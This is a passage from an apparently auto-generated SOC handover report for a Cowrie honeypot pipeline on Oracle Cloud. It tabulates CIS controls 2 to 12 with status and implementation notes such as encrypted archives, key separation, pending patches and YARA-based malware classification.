| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-19T22:57:19Z_
